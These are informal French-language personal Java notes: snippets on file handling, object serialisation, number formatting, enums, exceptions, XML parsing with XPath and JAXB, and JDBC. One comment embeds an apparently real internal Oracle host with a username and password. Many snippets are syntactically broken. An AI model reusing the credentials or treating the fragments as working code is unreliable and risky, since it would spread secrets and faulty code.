      		    for (int i = 0; i < list.length; i++) {
      		      //file = new File(directory + list[i]);
      		      file = new File(path, list[i]);
      		      boolean success = file.delete(); // supprimer un fichier: attention: success sera false et le fichier ne peut pas etre supprime si un readerinputstream est toujours ouvert sur le fichier. Il faut le .close()
      		    }
      			
      			logger.info("all files are purged ");
      	} 

serialiser un formulaire pour sauvegarder son remplissage sur le serveur pour que quand l'utilisateur lambda se reconnecte, il retrouve ses billes:
                                  		// Serialize the form into a file so as to be suggested again later for
                                  		// this user
                                  		GeaPropertiesManager geaPropertiesManager = new GeaPropertiesManager();
                                  		if(geaPropertiesManager.findPropertiesFile(Constants.GEA_PROPERTIES) && request.getParameter("save")!=null) 
                                  		{
                                  			try {
                                  				String folder = geaPropertiesManager.getProperty(Constants.SERIALIZATION_FOLDER).trim();
                                  				String ipn = mgr.getUser();
                                  				FileOutputStream file = new FileOutputStream(folder + File.separator + ipn + ".ser"); // on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
                                  				ObjectOutputStream oos = new ObjectOutputStream(file);
                                  				oos.writeObject(listActionForm);
                                  				oos.flush(); //Flushes this output stream and forces any buffered output bytes to be written out.
                                  				oos.close();
                                  			} catch (Exception e) {
                                  				logger.error(Utils.getStringStackTrace(e));
                                  			}
                                  		}
                                  		// initialize fields if a saved file exists => used if we have just made an action (delete, lock, add version etc)
                                  		if(Constants.TRUE.equals(request.getParameter("retour"))) {
                                  			if(geaPropertiesManager.findPropertiesFile(Constants.GEA_PROPERTIES)) {
                                  				try {
                                  					String folder = geaPropertiesManager.getProperty(
                                  							Constants.SERIALIZATION_FOLDER).trim();
                                  					String ipn = mgr.getUser();
      //deserialiser un objet                            		
                                  					FileInputStream fichier = new FileInputStream(folder + File.separator + ipn + ".ser");
                                  					ObjectInputStream ois = new ObjectInputStream(fichier);
                                  					
                                  					// We need to get the listElementForm and then copy the listActionForm values
                                  					// without writing on only listElementForm values (enCoursGreen...)
                                  					ListActionForm savedForm = (ListActionForm) ois.readObject();
                                  					listActionForm.copy(savedForm);
                                  				} catch (Exception e) {
                                  					logger.error(Utils.getStringStackTrace(e));
                                  				}
                                  			}
                                  		}		
pour creer des repertoires : create directories creer un repertoire create a directory creer repertoire create directory
                import java.io.*;
                  class CreateDirectory 
                  {
                     public static void main(String args[])
                    {
                    Properties properties = loadProperties(args[0]);
                        try{
                      String strDirectoy ="test";
                      String strManyDirectories="dir1/dir2/dir3";
                  
                      // Create one directory
                      boolean success = (new File(strDirectoy)).mkdir();
                      if (success) {
                        System.out.println("Directory: " + strDirectoy + " created");
                      }    
                      // Create multiple directories
                      success = (new File(strManyDirectories)).mkdirs();
                      Sinon peut etre mieux: FileUtils.forceMkdir(path);
                      if (success) {
                        System.out.println("Directories: " + strManyDirectories + " created");
                      }
                      }catch (Exception e){//Catch exception if any
                        System.err.println("Error: " + e.getMessage());
                      }
                    }
                  }
 pour remplacer les points par des virgules dans un nombre: 
        	@Test(timeout=100) public void replaceDotByCommaForNumbers_String()
        	{
        		assertTrue("lsdkf".equals(Utility.replaceDotByCommaForNumbers("lsdkf")));
        		assertTrue("lsd.kf".equals(Utility.replaceDotByCommaForNumbers("lsd.kf")));
        		assertTrue("000100".equals(Utility.replaceDotByCommaForNumbers("000100")));
        		assertTrue("0001,00".equals(Utility.replaceDotByCommaForNumbers("0001,00")));
        	  assertEquals("0001,00",Utility.replaceDotByCommaForNumbers("0001.00"));
        		assertEquals(",01",Utility.replaceDotByCommaForNumbers(".01"));
        		assertEquals("0,001.00",Utility.replaceDotByCommaForNumbers("0,001.00"));
        		assertEquals("0.001,00",Utility.replaceDotByCommaForNumbers("0.001,00"));
        		assertEquals("256 732 943,70",Utility.replaceDotByCommaForNumbers("256 732 943,70"));
        		assertEquals("256 732 943.70",Utility.replaceDotByCommaForNumbers("256 732 943.70"));
        		assertEquals("000100000",Utility.replaceDotByCommaForNumbers("000100000."));
        		assertEquals("0000000028660,42",Utility.replaceDotByCommaForNumbers("0000000028660.42"));
        	}
          public static String replaceDotByCommaForNumbers(String data)
          	{
          		try
          		{
          			data= data.trim();
          			boolean isNumber = true;
          			String[] split = data.split("\\."); //LINKs.sp.it
          			StringBuffer newData = new StringBuffer();
          			for (int i = 0; i < split.length; i++) 
          			{
          				if (!isInteger(split[i])) {	
          				isNumber=false;
          				}
          				newData.append(split[i]);
          				if (i!=split.length-1)
          				{
          				newData.append(",");
          				}
          			}
          			if (isNumber)
          			{
          				data = newData.toString();
          			}
          		}
          		catch (Exception e)
          		{
          			logger.error(e,e);
          		}
          		return data;
          	}
pour savoir si un string est un nombre:
        	@Test(timeout=100) public void isInteger_String1()
        	{
        		assertEquals(false,Utility.isInteger("000100000."));
        		assertEquals(true,Utility.isInteger("0001"));
        		assertEquals(true,Utility.isInteger("00"));
        		assertEquals(true,Utility.isInteger(""));
        		assertEquals(false,Utility.isInteger("0,001"));
        		assertEquals(false,Utility.isInteger("256 732 943 70"));
        		assertEquals(true,Utility.isInteger("000100000"));
        	}
        	public static boolean isInteger( String input )  
          	 {  
          	    try  
          	    {  
          	       Integer.parseInt( input );  
          	       return true;  
          	    }  
          	    catch( Exception e)  
          	    {  
          	    	if (input.length()==0) return true;
          	    	else return false;  
          	    }  
          	 }
 pour formater un nombre chiffre avec les espaces adequats:          	 
        	@Test(timeout=100) public void addSpacesForThousand1()
        	{
        		char espace = new DecimalFormatSymbols().getGroupingSeparator();
        		assertEquals("100 000",Utility.addSpacesForThousand("100000"));
        		assertEquals("100 000,00",Utility.addSpacesForThousand("100000,00"));
        		assertEquals("1 000 000,00",Utility.addSpacesForThousand("1000000,00"));
        		assertEquals("1 000 000,00",Utility.addSpacesForThousand("1000000,00"));
        	}
        		public static String addSpacesForThousand(String string) {
          		String ret = "";
          		String string2 = "";
          		try
          		{
          				int i = string.indexOf(",");
          				if (i!=-1)
          					{
          					string2 = string.substring(0,string.indexOf(","));
          					}
          				else string2 = string;
          				Long a = Long.parseLong(string2);
          				 NumberFormat nf = NumberFormat.getInstance(Locale.FRENCH);
          			        ret =  nf.format(a).toString();
          			        if (i!=-1) ret=ret.concat(",").concat((string.substring(i+1,string.length())));
          			   ret = ret.replace('\u00a0', ' ');
          		}
          		catch(Exception e)
          		{
          			ret=string;
          		}
          		return ret;
          	}
pour logger un prepared statement de manière d'un select : 
              essayer ca: System.out.println(pstmt.toString());
							sinon ca: System.out.println(WecUtil.preparedStatementFriendly(DELETE_FIELD_LIST_CMP, new String[] { idTemplate,idField,lng }));
							avec (voir utils):
							
          	
pour faire une requete par bouts morceaux
                          try 
                          {
                                setConnection(connection);
                                PreparedStatement preparedStatement = connection.prepareStatement(request);
                                preparedStatement.setfetchSize();
                                for (Iterator iter = realisesToInsert.iterator(); iter.hasNext() 
                                {
                                      IRealise real = (IRealise) iter.next();
                                            if (!real.isIgnore()) 
                                            {
                                                List<IChargeReal> listCharges = real.getListCharges();
                                                        for (Iterator iter2 = listCharges.iterator(); iter2.hasNext() 
                                                        {
                                                              IChargeReal charge = (IChargeReal) iter2.next();
                                                              int parameterIndex = 1;
                                                              preparedStatement.setObject(1 , charge.getIdPCP());
                                                                    for (int j = 0; j < charge.getValues().length; j++) 
                                                                    {
                                                                            parameterIndex++;
                                                                            preparedStatement.setDouble(parameterIndex , charge.getValues()[j]);
                                                                     }
                                                              preparedStatement.addBatch();
                                                                
                                                        }
                                            }
                                }
                                      /** query execute */
                                      preparedStatement.executeBatch();
                                      getFetchSize()
les enums : enum :
      si j'ai syntax error on token enum interface expected : 
                eclipse java compiler: choisir avant java 1.7
      creation de l'enum
                      public enum Sens {
                      	ENTREE,
                      	SORTIE
                      }
                      public enum ActionTypeEnum 
                      {
                       	save(0,"ACTTYPE_SAVE"),restore(1,"ACTTYPE_RESTORE"); // ici j'ai defini deux elements de liste de l'enum. (ca appelle le constructeur ci dessous)
                      	private int typeId;
                      	private String labelId;
                      	private String translation;
          
                  	private ActionTypeEnum(int typeId, String labelId){
                  		this.typeId = typeId;
                  		this.labelId = labelId;
                  	}
                  	@JsonValue // je peux metre ca si avec jackson je veut renvoyer du json
                    getLabelId()
                    {return this.labelId:}	
                  	// methode standard pour les enums
               		public static ActionTypeEnum getEnum(String type) // trouver un enum par sa cle. Mais si besoin trouver par un de ses champs faire : res = Arrays.stream(UnitiesForNumericParameters.values()).filter(e->e.value.equals("MO/S")).findFirst().get();
                   {
                		return (ActionTypeEnum)ActionTypeEnum.valueOf(ActionTypeEnum.class, type);
          	      }
          	      
          	      	public static ActionStatusEnum getEnumByTypeId(short typeId)
                    {
                      		switch (typeId) 
                      		{ 
                      		case 0: return ok; // attention toujours mettre a la fin un return ou un break 
                      		case 1: return ko;
                      		case 2: return running;
                      		default: return ok; (si on met "transient default: ...." alors c toujours executé a la fin LINKswcthfdf)
                      		}
                  getters setters....
    Utilisation de l'enum
        	/**
        	 * translate the label of EnumList
        	 * @param request
        	 */
        	private boolean translateEnum(HttpServletRequest request) {
        		boolean isDone = false;	
        		Locale locale = (java.util.Locale) request.getSession(false).getAttribute(org.apache.struts.Globals.LOCALE_KEY);
        		for(ActionTypeEnum lmt : ActionTypeEnum.getEnumList()){
        			String translation = this.getResources(request).getMessage(locale, lmt.getLabelId());
        			lmt.setTranslation(translation);
        		}	
        		isDone = true;
        		return isDone;
        	}
    dans une classe je peux faire deux methodes de meme signature sauf que l'enum change: j'ai l'enum TATA et l'enum TITI je peux faire
          public void toto(String blibli, TATA bloblo, String blabla)...
          public void toto(String blibli, TITI bloblo, String blabla);
  

pour faire mes propres exceptions : customisées customises customized checkedexception checked exception: déclarés dans le code; unchecked exception: se produisent qu'au run
          ma classe d'exception 
          public class TooMuchDB2RowsException extends Exception 
          {
            	public TooMuchDB2RowsException(String string) 
            	{
            		super(string);
            	}
          ....
          eventuellement si on appelle une methode function fonction qui renvoit mon exception par introspection: voici comment catcher:
           		}
               catch (InvocationTargetException ex) 
               {
              			Exception th=null; 
              			if (ex.getClass().isInstance(new Exception()) ou plutot ex instanceof Exception linkinstanceof c'est mieux voir LINKkgjhjhjhjhjhjc
              			{
                      ....              			
                    }
              			else if(ex.getTargetException().getClass().isInstance(new TooLenghtXmlException("")) || ex.getTargetException().getClass().isInstance(new TooMuchDB2RowsException("")))
              			{
              				th=(Exception)ex.getTargetException();
              			}
              			else
              			{
              				th=new Exception(ex);
              			}
              			throw th;
              		}
		    Throwable
		  /          \
		Error         Exception
	unchecked           /     \
ex:OutOfMemoryError	 checked  RuntimeException. ex:NullPointerException
	                                unchecked
	                                
Pour faire un graphique dans une appli web:
  une bonne librairie javascript: 
            <script src="<%=request.getContextPath()%>/js/jquery.min.js"></script>
            <script src="<%=request.getContextPath()%>/js/highcharts.js"></script>
    Dans mon action struts:
      A la fin:
        document = new PdfRestitution(request, response, chart);
        document.getPresentation(datas);
        return null;
   public class PdfRestitution extends DocumentRestitution {
        public PdfRestitution(HttpServletRequest request, HttpServletResponse response, Integer chart) throws IOException {
    		super(request, response, chart);
    		response.addHeader("content-disposition", "inline; filename=mtbf.pdf");
    		response.setContentType("application/pdf");
    		out = response.getOutputStream();
    	}
      ... a finir...(projet OPA)
        
pour savoir si un nombre est paire ou impaire:
      if ( n % 2 == 0 ) {
         System.out.println(n + " est pair.");
      else {
         System.out.println(n + " est impair.");
setMarkupAttribute("border", "1");
pour savoir si un int est defini par defaut il est egal à 0.
DOM parseur : avec Xpath (a partir de java 5 je crois)
                            Document document =null;
                            		File fileObj = new File(filePath);
                            		DocumentBuilderFactory builderFactory =DocumentBuilderFactory.newInstance();
                            		DocumentBuilder builder = null;
                            		try {
                            		    builder = builderFactory.newDocumentBuilder();
                            		} catch (ParserConfigurationException e) {
                            		    e.printStackTrace();  
                            		}			
                            		try {
                            		    document = builder.parse(new FileInputStream(filePath));
                            		      ou
                            		    document = builder.parse( new InputSource( new StringReader( respXML ) ) );
                            		} catch (SAXException e) {
                            		    e.printStackTrace();
                            		} catch (IOException e) {
                            		    e.printStackTrace();
                            		}
                            		XPath xPath =  XPathFactory.newInstance().newXPath();
                            		 //TOTOTOT/TOTITIT//DNFSDF  ici on cherche tous les enfants DNFSDF meme indirects
                            		 TATATA/ancestor:TETETE  ici on cherche un parent meme indirect egal a <TETETE>
                            		//String expression = "//RN-CLIP-LAUNCH-ACTUATOR/@ACTUATOR-CODE";
                            		String expression = "//RN-CLIP-LAUNCH-ACTUATOR | //RN-CLIP-DISPLAY-DEFAULTS | //RN-CLIP-ERASE-ALL-DEFAULTS | //RN-CLIP-DISPLAY-DEFAULTS | RN-CLIP-DISPLAY";	 		 
                            
                            		//read a string value
                            		String email = xPath.compile(expression).evaluate(document);
                            		 
                            		//read an xml node using xpath
                            		Node node = (Node) xPath.compile(expression).evaluate(document, XPathConstants.NODE);
                            		 
                            		//read a nodelist using xpath
                            		NodeList nodeList = (NodeList) xPath.compile(expression).evaluate(document, XPathConstants.NODESET);
Creer depuis xsd une grappe d'objets classes java pour la conversion convertir en deux sens xml et java
      D:\Java\jdk1.8.0_151>xjc -encoding UTF-8 pathVersFichierXsdOuMemeUneURLD:/Profiles/lduverge/workspace/wenhuaduvergeamazonfeed/src/main/resources/product.xsd -p com.wenhuaduverge.jaxb -d D:\Profiles\lduverge\workspace\wenhuaduvergeamazonfeed\src\main\java
Convertir un objet java contenant une liste d'objets java en fichier xml:
  context = JAXBContext.newInstance(MaClasse.class); // attention depuis java11 jaxb degage
  Marshaller m=context.createMarshaller();
  m.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT,true);
  m.marshal(UneListeDeMaClasse,newStreamResult(newFileOutptStream(new File("xx"));

  
 
Convertir parser xml en objet java:
    classe de definition:
          import java.util.List;
            import javax.xml.bind.annotation.XmlElement;
            import javax.xml.bind.annotation.XmlRootElement;
                  @XmlRootElement(name = "users")
                  public class JaxbUserRepository {
                      @XmlElement(name = "user")
                      private List<JaxbUser> users;              
                      public List<JaxbUser> getUsers() {
                          return users;
                      }
                          @XmlAttribute(required = true)
                          private String password;
                          @XmlElement(name="group")
                          @Path("titito") // facultatif : je crois que c'est pour changer le path dans le xml resultant
                          private List<String> groups;

                  }
       dans le main:
          import javax.xml.bind.JAXBContext;
          import javax.xml.bind.JAXBException;
          import javax.xml.bind.Unmarshaller;
            final JAXBContext jc = JAXBContext.newInstance(JaxbUserRepository.class);
            final Unmarshaller u = jc.createUnmarshaller();
            final JaxbUserRepository jaxbUserRepository =
                    (JaxbUserRepository)u.unmarshal( new File( userFilePath ) );

            final List<JaxbUser> jaxbUsers = jaxbUserRepository.getUsers();

    
DOM parseur : (vieille methode) 
// permet de parser un xml avec xpath et on peut soit ecrire le contenu des nodes trouves (uniquement le texte) ou bien tout le contenu grace a la methode getElementContent ci dessous:
                                                                          package ddd.com;
                                                                          
                                                                          import java.io.File;
                                                                          import java.io.FileInputStream;
                                                                          import java.io.IOException;
                                                                          import java.io.StringWriter;
                                                                          import java.util.Hashtable;
                                                                          import java.util.LinkedHashSet;
                                                                          import java.util.Map;
                                                                          
                                                                          import javax.xml.parsers.DocumentBuilder;
                                                                          import javax.xml.parsers.DocumentBuilderFactory;
                                                                          import javax.xml.parsers.ParserConfigurationException;
                                                                          import javax.xml.transform.OutputKeys;
                                                                          import javax.xml.transform.Transformer;
                                                                          import javax.xml.transform.TransformerException;
                                                                          import javax.xml.transform.TransformerFactory;
                                                                          import javax.xml.transform.dom.DOMSource;
                                                                          import javax.xml.transform.stream.StreamResult;
                                                                          import javax.xml.xpath.XPath;
                                                                          import javax.xml.xpath.XPathConstants;
                                                                          import javax.xml.xpath.XPathFactory;
                                                                          
                                                                          import org.junit.Test;
                                                                          import org.w3c.dom.Document;
                                                                          import org.w3c.dom.Node;
                                                                          import org.w3c.dom.NodeList;
                                                                          import org.xml.sax.SAXException;
                                                                          
                                                                          import com.documentum.fc.client.IDfSession;
                                                                          
                                                                          public class Tests {
                                                                          
                                                                          	static java.io.FileOutputStream destinationFile=null;
                                                                          	static File xmlFile=null;
                                                                          	static IDfSession session;
                                                                          	static Map<String,String> xpaths= new Hashtable<String,String>();
                                                                          	static Map<String,LinkedHashSet<String[]>> xmlElements= new Hashtable<String,LinkedHashSet<String[]>>();
                                                                          	private static String extraction;
                                                                          
                                                                              	
                                                                                 
                                                                              	
                                                                              	@Test
                                                                                public void oneTest() throws Exception
                                                                              	{
                                                                              		//xpaths.put("mdsie30_mr", "//PTXT/RN-RDC-ACCESS");
                                                                              		xpaths.put("mdsie30_mr", "//ptxt/RN-RDC-ACCESS");
                                                                              		LinkedHashSet<String[]> xmlElement = new LinkedHashSet<String[]>();
                                                                              		xmlElement = new LinkedHashSet<String[]>();
                                                                              		xmlElement.add(new String[]{"RN_RDC_ACCESS_COMPLET",XmlObjectEnum.attribute.label});
                                                                              		xmlElement.add(new String[]{"RDC-ELEMENT-DESC",XmlObjectEnum.attribute.label});
                                                                              		xmlElement.add(new String[]{"RDC-ELEMENT-REF",XmlObjectEnum.attribute.label});
                                                                              		xmlElement.add(new String[]{"RDC-OPERATION-DESC",XmlObjectEnum.attribute.label});
                                                                              		xmlElement.add(new String[]{"RDC-ELEMENT-REF",XmlObjectEnum.attribute.label});
                                                                              		xmlElements.put("mdsie30_mr", xmlElement);
                                                                                  
                                                                              		xmlFile=new File("//f-mehen/home5$/p036782/MyDocs/DDD/resultatRequetes/090135f3803533dc.xml");
                                                                              		recherchedansxml(xpaths.get("mdsie30_mr"));
                                                                              		
                                                                              	}
                                                                              	public static void recherchedansxml(String expression) throws Exception
                                                                              	{
                                                                              		Document document =null;
                                                                              			DocumentBuilderFactory builderFactory =DocumentBuilderFactory.newInstance();
                                                                              			DocumentBuilder builder = null;
                                                                              			try {
                                                                              			    builder = builderFactory.newDocumentBuilder();
                                                                              			} catch (ParserConfigurationException e) {
                                                                              			    e.printStackTrace();  
                                                                              			    throw e;
                                                                              			}			
                                                                              			try {
                                                                              				System.out.println("parsexml");
                                                                              			    document = builder.parse(new FileInputStream(xmlFile));
                                                                              			} catch (SAXException e) {
                                                                              			    e.printStackTrace();
                                                                              			    throw e;
                                                                              			} catch (IOException e) {
                                                                              			    e.printStackTrace();
                                                                              			    throw e;
                                                                              			}
                                                                              			XPath xPath =  XPathFactory.newInstance().newXPath();
                                                                              			//read a string value
                                                                              			//String email = xPath.compile(expression).evaluate(document);
                                                                              			 
                                                                              			//read an xml node using xpath
                                                                              			//Node node = (Node) xPath.compile(expression).evaluate(document, XPathConstants.NODE);
                                                                              			 
                                                                              			//read a nodelist using xpath
                                                                              			NodeList nodeList = (NodeList) xPath.compile(expression).evaluate(document, XPathConstants.NODESET);
                                                                              			for( int i =0; i<nodeList.getLength(); i++)
                                                                              			{
                                                                              				System.out.println(getElementContent(nodeList.item(i).getParentNode(),"--"));
                                                                              			}
                                                                              	}
                                                                              	public static String getElementContent(Node element,String defaultStr) throws Exception
                                                                              	{
                                                                              		TransformerFactory transFactory = TransformerFactory.newInstance();
                                                                              		Transformer transformer = transFactory.newTransformer();
                                                                              		StringWriter buffer = new StringWriter();
                                                                              		transformer.setOutputProperty(OutputKeys.OMIT_XML_DECLARATION, "yes");
                                                                              		transformer.transform(new DOMSource(element), new StreamResult(buffer));
                                                                              		String str = buffer.toString();
                                                                              		return str;
                                                                              	}
                                                                              	 public static String getElementContentOLD(Node element, String defaultStr)
                                                                                   throws Exception
                                                                                {
                                                                                   if (element == null)
                                                                                      return defaultStr;
                                                                          
                                                                                   NodeList children = element.getChildNodes();
                                                                                   String result = "";
                                                                                   for (int i = 0; i < children.getLength(); i++)
                                                                                   {
                                                                                      if (children.item(i).getNodeType() == Node.TEXT_NODE || 
                                                                                          children.item(i).getNodeType() == Node.CDATA_SECTION_NODE)
                                                                                      {
                                                                                         result += children.item(i).getNodeValue();
                                                                                      }
                                                                                      else if( children.item(i).getNodeType() == Node.COMMENT_NODE )
                                                                                      {
                                                                                         // Ignore comment nodes
                                                                                      }
                                                                                   }
                                                                                   return result.trim();
                                                                                }
                                                                              	
                                                                              	public enum XmlObjectEnum 
                                                                              	{
                                                                              	 	attribute(0,"attribute"),name(1,"name"),content(2,"content"); // ici j'ai defini deux elements de liste de l'enum. (ca appelle le constructeur ci dessous)
                                                                              		private int id;
                                                                              		private String label;
                                                                          
                                                                              		private XmlObjectEnum(int typeId, String labelId)
                                                                              		{
                                                                              			this.id = typeId;
                                                                              			this.label = labelId;
                                                                              		}
                                                                              		// methode standard pour les enums
                                                                              		public static XmlObjectEnum getEnum(String type)
                                                                              		{
                                                                              			return (XmlObjectEnum)XmlObjectEnum.valueOf(XmlObjectEnum.class, type);
                                                                              		}
                                                                              	 }
                                                                          
                                                                          }
VIEILLE METHODE. Depuis java 5 ou 6 ca ne marche plus car on utilise plus apache mais javax
    import org.apache.xerces.parsers.DOMParser;
    import org.w3c.dom.Document;
    import org.w3c.dom.Node;
    import org.w3c.dom.Element;
    import org.w3c.dom.NodeList;
    import org.xml.sax.*;
    import org.apache.xpath.XPathAPI;
        private static void LancerParsageFichiers()
        {
            try
            {
                (...)
                VerifConformiteXml(i); // voir methode apres celle ci dessous
                DOMParser parser = new DOMParser();
                parser.setFeature ("http://xml.org/sax/features/validation", false);
                // on va parser sans interrompre le traitement si xml n est pas conforme au dtd:
                IgnorerDTD(i);         // voir methode apres celle ci dessous
                parser.parse("chemin vers mon fichier xml");
                // parsage
                Document document = parser.getDocument();
                Traverse(document);         // voir methode apres celle ci dessous
            }
          catch (SAXException e)
          {
            cat.fatal("SaxExceptionboucle "+e);//err
          }
          catch (IOException e)
          {
            cat.fatal("IOException"+e);//err
          }
          catch (SecurityException e)
          {
            cat.fatal("SecutityIOException"+e);//err
          }
          catch (ClassNotFoundException e)
          {
            cat.fatal("ClassNotFoundException " + e);
          }
        }
    VERIFIER CONFORMITE FICHIER XML :
          private static void VerifConformiteXml(int i)
          {
            //Verification du xml vis a vis du dtd local dont le nom doit etre "Action.dtd"
            cat.debug("> VerifConformiteXml");
            DOMParser ParserVerif = new DOMParser();
            try
            {
              //verification du xml suivant le dtd
              ParserVerif.setFeature ("http://xml.org/sax/features/validation", true);
              //valide avec precision
              ParserVerif.setErrorHandler(new ErrorHandler()
              {
                public void warning(SAXParseException ex) throws SAXException
                {
                  throw ex;
                }
                public void error(SAXParseException ex) throws SAXException
                {
                  throw ex;
                }
                public void fatalError(SAXParseException ex) throws SAXException
                {
                  throw ex;
                }
              }
              );
              //indique le chemin du dtd
              ParserVerif.setEntityResolver( new EntityResolver()
              {
                public InputSource resolveEntity(String publicID, String systemID) throws IOException, SAXException
                {
                  if(systemID.endsWith("Action.dtd"))
                  {
                    cat.debug("recupere dtd local");
                    return new InputSource(DirGespro+"Action.dtd");
                  }
                  return null;
                }
              });
        
              ParserVerif.parse(DirGespro.concat(nomsfich[i]));
              Document DocumentVerif = ParserVerif.getDocument();
              ParserVerif.reset();
            }
            catch (java.lang.Exception e)
            {
              cat.warn("Fichier xml non conforme au dtd OU Chemin du dtd non specifie dans le fichier xml: "+e); //err
            }
           /* catch (SAXNotRecognizedException e)
            {
               log("SAXNotRecognizedException WARNING: "+e); //err
            }
            catch (SAXNotSupportedException e)
            {
               log("SAXNotSupportedException WARNING: "+e); //err
            }
            catch (IOException e)
            {
              log("ALERT SYSTEM: IOException"+e); //err
            }
            catch (SAXException e)
            {
               log("ALERT SYSTEM: SaxExceptionVerifXml"+e); //err
            }*/
          }
          private static void IgnorerDTD (int i)
            {
              cat.debug(">ignorerdtd");
              // Pour supprimer du fichier xml la premiere ligne ligne contenant le chemin vers le dtd
              try
              {
                RandomAccessFile lirexml = new RandomAccessFile(new File (DirGespro.concat(nomsfich[i])),"rw");
                // attention, RandomAccessFile.readLine() est incapable de lire de l'encodage utf-8 pour cela utiliser la methode voir: readLine() 
                long filePointer = 0;
                String ligne = "";
                while ((ligne = lirexml.readLine())!=null)
                {
          
                  filePointer = lirexml.getFilePointer();
                  cat.debug("ligne en cours " + ligne);
                  if (ligne.startsWith("<!DOC"))
                  {
                    long longueur = ligne.length();
                    lirexml.seek(filePointer - longueur -2); // -2: correspond a \n... pas elegant il faut trouver mieux
                    for (i=0; i<longueur; i++)
                    {
                      lirexml.writeBytes(" ");
                    }
                    cat.debug ("fin instruction");
                    break;
                  }
                }
                lirexml.close();
              }
              catch (IOException e)
              {
                cat.fatal ("IOException"+e);//err
              }
            }
            
         private static void Traverse (Node node)  throws IOException
            {
              int type = node.getNodeType();
              String name = node.getNodeName();
              if (name.compareToIgnoreCase("InscriptionAgent")==0)
              {
                if (node.getAttributes().getLength()==4 && node.getChildNodes().item(1).getNodeName().compareTo("IA_Apprenant")==0)
                {
                  if (node.getAttributes().getNamedItem("datedebut")!= null)
                    datedebut=node.getAttributes().getNamedItem("datedebut").getNodeValue();
              (...)
              NodeList children = node.getChildNodes();
              if (children !=null)
              {
                for (int i=0; i<children.getLength(); i++) Traverse(children.item(i));
              }
              //pour mettre des retours chariots apres manipulation du xml si tout s'ecrit a la ligne
                /*TransformerFactory tfactory = TransformerFactory.newInstance();
                Transformer tranformer = tfactory.newTransformer();
                tranformer.setOutputProperty(OutputKeys.INDENT, "yes"); */
            }
             // pour faire une requete xpath: 
             NodeIterator  nl = XPathAPI.selectNodeIterator(document, "mon xpath!");

pour connaitre savoir le type d'une classe: LINKkgjhjhjhjhjhjc 
    	instanceof
    	   exemple:
          if (maclasse instanceof Command)...
    	ou bien:
    	e.getClass().getName()
Objet java.sql.Statement: 
		attention quand on fait des addBatch("une requete"); à la suite, à la fin faire connection.commit(); et non pas addBatch("commit");
		pour commiter si on est en Autocommit à false
		toujours declarer la connection et le statement à null en dehors de try
Bonne pratique d'autocommit si autocommit est à false:
                      connection.setAutoCommit(false);
                			int result = dbUtil.execUpdateQuery(UPDATE_VISITOR, parameters, connection);
                			connection.commit();
                			if (result == 0) {
                				// 0 rows updated
                				throw new Exception(getError());
                			}
                		} catch (Exception e) {
                			LOGGER.error("PreNoticeVisitorsDAO::update", e);
                			connection.rollback();
                			throw e;
                		}
                		finally
                		{
                			connection.setAutoCommit(true);
                		}
                	}


se connecter à une base de donnee oracle: 
			public static Connection initConnection(String driver, String url, String user, String password) throws ClassNotFoundException, SQLException{
			// ou driver c'est oracle.jdbc.driver.OracleDriver pour oracle.
				Connection conn = null; 
				try{
					Logger.out.debug("Openinig DB Connection");
					Class.forName(driver);            // important pour declarer le driver au driver manager. driver c par exemple: "oracle.jdbc.driver.OracleDriver" ou "com.mysql.jdbc.Driver"
        					(
                      //on peut aussi faire ca pour declarer le driver, mais jamais essaye
                        import oracle.jdbc.driver.OracleDriver;
                        DriverManager.registerDriver(new OracleDriver());
                  )
					conn = DriverManager.getConnection(url, user, password); // exemple: java.sql.DriverManager.getConnection("jdbc:oracle:thin:@hpsd1805.mc2.renault.fr:1526:sajdevo01", "saj_adm", "saj_adm_01");
				}catch (ClassNotFoundException ce){
					Logger.out.error("Oracle Driver not found: " + ce);
					throw ce;
				}catch (SQLException se){
					Logger.out.error("Unable to connect with the Oracle DataBase:" + se);
					throw se;
				}catch (Throwable se){
					Logger.out.error("Unable to connect with the Oracle DataBase:" + se);
					throw se;
				}finally{
					return conn;
				}
			}
break:
		ne sort que d'un niveau si par exemple il y a deux boucles imbriquees et qu'on met le break dans la deuxieme boucle, la premiere continue.
les short: 
	 vont jusqu'a 32000

pour acceder à un fichier sous webcontent en java: 
	request.getSession(false ou true).getServletContext().getRealPath("/resources/Tableau_de_bord.xls") // attention recree une  nouvelle session si elle n'existe plus (mettre false si on veut que ca renvoit null en cas de perte de session)
        // ou getServet().getServletContext()
  	where /resources/Tableau_de_bord.xls is present inside the webcontent
	ou 
    ClassificationNodeTest.class.getClassLoader().getResource(".")	ClassLoader.getResourceAsStream() ; ClassLoader.getResource() voir LINKgetRes9 verifier avec System.out.println("CLASSPATH: " + System.getProperty("java.class.path")); System.out.println("ClassLoader resource path: " + HRParameters.class.getClassLoader().getResource("hr-openhr-for-ta.properties")); voir LINKgetRes9 System.out.println("ClassLoader resource path: " + ClassLoader.getSystemResourceAsStream("hr-openhr-for-ta.properties"));
    WelcomePresentor.class.getClassLoader().findResource("demo.css").getPath()
pour acceder à un fichier depuis une jsp 	
	pageContext.getServletContext().getRealPath (url) 
pour acceder à un fichier situe dans le classpath: 
			this.getClass().(getClassLoader()?.)getResourceAsStream("cheminVers/monFichier.toto)); (getClass est une methode de l'objet java "Object" verifier avec System.out.println("CLASSPATH: " + System.getProperty("java.class.path")); System.out.println("ClassLoader resource path: " + SaveXMLTest.class.getClassLoader().getResource("").getPath() ou HRParameters.class.getClassLoader().getResource("hr-openhr-for-ta.properties")); System.out.println("ClassLoader resource path: " + ClassLoader.getSystemResourceAsStream("hr-openhr-for-ta.properties"));   LINKgetRes9
pour faire une classe abstraite: // on ne peut pas faire  new maclasseabstraite . ses enfants peuvent utiliser ses var et method qui doivent alors etre public ou protected 
	public abstract class AbstractIndicateur {
	   possible exister methode abstaites sans corp devant etre overridé par les methodes filles
                exemple: public abstract IController returnController(String controllerName) throws Exception;
	   Grace a ca je peux dans cette classe abstraite appeler cette methode qui n'existe pas ici mais que dans les filles. (Attention à bien mettre public ou protected)
	}
	classe fille:
      super: en java: appele la classe au dessus... (extend)
Varargs : pour envoyer des arguments à une methode :
			pour une methode qui a cette signature : public static String format(String pattern, Object... arguments);  trois petits points
			on peut l'appeller comme ca: 
							Object[] arguments = {new Integer(7),new Date(),"a disturbance in the Force"};
							String result = format("balblabla", arguments);
			ou comme ca: 
							String result = format("blablabla",7, new Date(), "a Disturbance in the Force");
les sous classes de collection sont:
